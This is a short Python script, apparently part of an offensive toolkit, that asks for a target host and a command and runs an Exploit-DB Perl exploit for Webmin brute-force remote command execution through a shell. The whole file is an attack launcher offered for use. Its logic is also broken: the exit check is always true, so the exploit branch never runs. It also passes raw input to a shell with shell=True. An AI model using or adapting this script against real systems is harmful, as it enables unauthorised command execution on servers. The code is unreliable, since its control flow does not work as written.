import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


def exploit():
    while True:
        target = input(f"{Colors.red}(Webmin Bruteforce Remote Command Execution) [Enter Host]:~#")
        cmd = input(f"{Colors.red}(Webmin Bruteforce Remote Command Execution){Colors.end} [Enter Command]:~#")
        if target or cmd == "back" or "exit":
            break
        elif target or cmd == "options":
            print('''
Enter Host: 192.168.0.5
Enter Command: "uptime"\n\n''')
        else:
            sub.call(f"perl /usr/share/exploitdb/exploits/multiple/remote/705.pl {target} {cmd}", shell=True)
            break


exploit()
